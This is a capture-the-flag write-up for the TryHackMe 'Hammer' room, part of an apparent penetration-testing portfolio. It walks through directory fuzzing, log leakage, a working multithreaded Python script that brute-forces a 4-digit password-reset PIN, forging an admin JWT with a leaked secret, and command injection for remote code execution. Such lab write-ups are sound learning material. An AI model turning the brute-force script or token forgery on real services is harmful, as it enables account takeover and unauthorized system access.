# 🛠️ TryHackMe: Hammer  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/hammer)

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

#### About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

---

## 🧠 Summary

This assessment simulates a real-world web application compromise focused on abusing weaknesses in authentication logic and insecure token handling.

The compromise path involves directory discovery, log leakage, a 4-digit PIN password-reset bypass, and ultimately privilege escalation through forged JWT tokens, resulting in full remote code execution.

### Key Themes
- Targeted enumeration and directory discovery  
- Sensitive data exposure through application logs  
- Bypassing the password-reset flow via PIN brute-forcing  
- JWT analysis, secret leakage, and token forging  
- Privilege escalation to admin  
- Remote code execution through command injection  

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **Nmap**         | Service and port discovery |
| **ffuf**         | Directory enumeration |
| **Python script** | Brute‑forcing 4‑digit PIN codes |
| **JWT.io**        | Inspecting and signing JSON Web Tokens |
| **Burp Suite**   | Intercepting, modifying, and replaying requests |

---

## 🚀 Attack Path

### 1. 🔎 Port Scan

```bash
nmap -sV -p- -T4 10.10.81.17
```

**Open Ports**
- **22/tcp** — SSH  
- **1337/tcp** — HTTP service

---

## 📂 Source Code Review

By inspecting the page source, a suspicious directory reference appeared:
```nginx
hmr_directory_name
```
This suggested the presence of hidden functionality.

---

## 3. 🕵️‍♂️ Directory Fuzzing

**Using a wordlist based on the discovered prefix:**
```bash
ffuf -u http://10.10.51.17:1337/FUZZ/ \
     -w hmr-prefixed.txt -mc 200,301,302,403 -r
```

**Discovered Directory:**
```bash
/hmr_logs
```

---

## 4. 🔍 Log Analysis

**Navigating to the logs revealed:**
```bash
/hmr_logs/error.logs
```

**The file contained a leaked email address:**
```text
tester@hammer.thm
```
This would later be used during the password reset process.

---

## 5. 🔐 Brute‑forcing the PIN

Using the **"Forgot Password?"** mechanism triggered a PIN‑based reset flow.  
A custom Python script was used to brute‑force the **4‑digit PIN**, allowing the password to be reset.

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://10.10.51.17:1337/reset_password.php"
email = "tester@hammer.thm"

# Genereer alle 4-cijferige codes (0000–9999)
codes = [f"{i:04}" for i in range(10000)]

def check_code(code):
    data = {"email": email, "code": code}
    response = requests.post(url, data=data)

    # Hier baseline invullen, bijvoorbeeld een foutmelding
    if "Invalid code" not in response.text:
        return code
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(check_code, code) for code in codes]

    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"Geldige code gevonden: {result}")
            executor.shutdown(wait=False)
            break
```
#### 📘 Explanation of the Brute-Force Script

The Python script above automates the process of brute-forcing the 4-digit PIN used in the password-reset mechanism.
Here’s a breakdown of how it works:

**1. Generating All Possible PIN Codes**
```python
codes = [f"{i:04}" for i in range(10000)]
```
This generates every possible 4-digit value from 0000 to 9999, formatted with leading zeros.
Total combinations: 10,000.

**2. Multi-Threaded Execution**
```python
with ThreadPoolExecutor(max_workers=50) as executor:
```
To speed up the brute-force attack, the script uses 50 concurrent threads, allowing multiple PINs to be tested at the same time.
This dramatically reduces the time needed from minutes → seconds.

**3. Sending Requests to the Password Reset Endpoint**
```python
data = {"email": email, "code": code}
response = requests.post(url, data=data)
```
For each PIN, the script sends a POST request containing:
- The leaked email address
- The current PIN being tested

This mimics the normal reset-password request that a user would send through the web interface.

**4. Detecting a Valid PIN**
```python
if "Invalid code" not in response.text:
    return code
```
The server responds with the message **"Invalid code"** whenever a PIN is incorrect.
So, when that message *does not appear*, the PIN is assumed to be correct.

This type of vulnerability is called a **response-based oracle**, where subtle differences in server responses leak information.

**5. Stopping When the Correct Code Is Found**
```python
executor.shutdown(wait=False)
break
```
As soon as one thread finds a valid PIN, all other threads are stopped early.
This prevents unnecessary traffic and speeds up completion.

**Result**

The script successfully brute-forced the correct 4-digit PIN, allowing the password reset to complete and granting access to the account.
This ultimately led to the discovery of the first flag.
```text
THM{REDACTED}
```

---

## 6. 💻 Command Injection Discovery

Inside the authenticated panel, a command execution field accepted only limited input.  
Although most commands were filtered, the command `ls` successfully executed.

**This revealed an interesting file:**
```text
188ade1.key
```

**Inspecting it showed the JWT secret key:**
```text
56058354efb3daa97ebab00fabd7a7d7
```
This secret key became crucial for escalating privileges later in the attack.

---

## 7. 🛡️ JWT Token Exploitation

With the discovered JWT secret key, the existing session token could be decoded and modified.  
Using **jwt.io**, the token was loaded and the payload was edited to escalate privileges.

### Steps:
1. Load the original JWT in jwt.io  
2. Insert the secret key to allow signature generation  
3. Modify the payload field: "user"→"admin"
4. Generate a new, valid token with admin privileges:

**Final Modified Token:**
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzUzODE3NjM5LCJleHAiOjE3NTM4MjEyMzksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.89bKAVq7f0ytB5aFIXtvrK2_I0wV9vJSR83ihrS40O0
```
This token granted full administrative access.

---

## 8. 📬 Token Abuse for RCE

With the newly forged admin JWT, privileged functionality became accessible.  
Using **Burp Suite**, an authenticated request was intercepted and modified to execute system commands.

**The following command was injected to retrieve the final flag:**
```bash
cat /home/ubuntu/flag.txt
```
**Retrieved Flag:**
```text
THM{REDACTED}
```

---

## 🏁 Flags Collected

| Flag         | Location            | Value                    |
| ------------ | ------------------- | ------------------------ |
| 🧍 User Flag | Authenticated Panel | `THM{REDACTED}`      |
| 👑 Root Flag | `/home/ubuntu`      | `THM{REDACTED}` |

## 🔗 Room Links

📸 [**Screenshots**](../../challenges/thm-hammer/screenshots.md)

🔗 [**TryHackMe Room**](https://tryhackme.com/room/hammer)

---

## 💭 Reflectie

This room provided a solid mix of techniques, including directory fuzzing, JWT manipulation,  
and command injection. Working with JWT secrets and forging tokens to obtain admin privileges  
was especially insightful.

The step-by-step progression — from enumeration to full remote code execution — showed how  
small weaknesses can chain together into a complete system compromise. Tools like **ffuf**,  
**Burp Suite**, and custom **Python scripting** proved essential throughout the process.

Overall, a challenging and valuable room that helped sharpen my penetration testing skills.

### 🎯 Key Takeaways
- Weak directory naming conventions can leak internal structure  
- Logs often expose sensitive data  
- Hardcoded JWT secrets = instant privilege escalation  
- Chaining small findings leads to full system compromise  
